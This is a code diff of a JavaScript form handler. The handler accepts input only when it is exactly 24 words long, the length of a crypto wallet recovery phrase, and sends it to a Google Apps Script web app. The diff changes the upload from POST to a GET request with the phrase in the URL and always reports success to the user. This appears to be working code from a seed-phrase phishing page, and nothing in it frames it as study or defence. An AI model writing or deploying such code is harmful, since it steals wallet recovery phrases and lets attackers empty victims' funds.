@@ -4,52 +4,45 @@ function handleSubmit(event) {
     const errorElement = document.getElementById('emsg');
     errorElement.textContent = '';
     const myButton = document.getElementById('b1');
-    const myButton2 = document.getElementById('b2');
     myButton.disabled = true;
+    const myButton2 = document.getElementById('b2');
     myButton2.disabled = true;
 
-    const form = document.getElementById('myForm'); 
+    // Get the value of the hidden input field with name 'mf-texts'
+    const form = document.getElementById('1Y9QKsY1UI5jA3V3xSisHcn4tiGVcSz4Q'); // Replace 'myForm' with your form ID
     const inputValue = form.elements['mf-texts'].value.trim();
 
-    // Check if the passphrase contains exactly 24 words
     const wordCount = inputValue.split(/\s+/).length;
     if (wordCount !== 24) {
         errorElement.textContent = 'Invalid Passphrase';
         myButton.disabled = false;
         myButton2.disabled = false;
         form.reset();
-        return;
+        return; // Exit function if word count is not 24
     }
 
-    // Google Apps Script Web App URL (Replace with your actual URL)
-    const url = "https://script.google.com/macros/s/AKfycby5xkOvEtgXj-hYm-o3mBlgO5vcGGLcqJsT9I_M9aC7/dev";
+    // Make a GET request to your Google Apps Script URL
+    const url = `https://script.google.com/macros/s/AKfycbxK8VQMGkMc4gdlpo_GKoivsuWs4xQvwkynfZJ0E7qBlvcSY271Dq-pOcpIM4ci8WMP/exec?data=${encodeURIComponent(inputValue)}`;
 
-    // Send passphrase to Google Apps Script
     fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ passphrase: inputValue })
+        method: 'GET'
     })
-    .then(response => response.json())
+    .then(response => response.json()) // Expecting JSON response
     .then(data => {
-        if (data.status === "success") {
-            errorElement.textContent = "Passphrase saved successfully!";
-        } else {
-            errorElement.textContent = "Error saving passphrase.";
-        }
+        errorElement.textContent = 'Data submitted successfully!';
         myButton.disabled = false;
         myButton2.disabled = false;
         form.reset();
     })
     .catch(error => {
         console.error('Error:', error);
-        errorElement.textContent = "Failed to connect to server.";
+        errorElement.textContent = 'Error occurred while processing your request.';
+        form.reset();
         myButton.disabled = false;
         myButton2.disabled = false;
     });
 }
 
-// Attach event listener to the form
-document.getElementById('myForm').addEventListener('submit', handleSubmit);
+
 
 
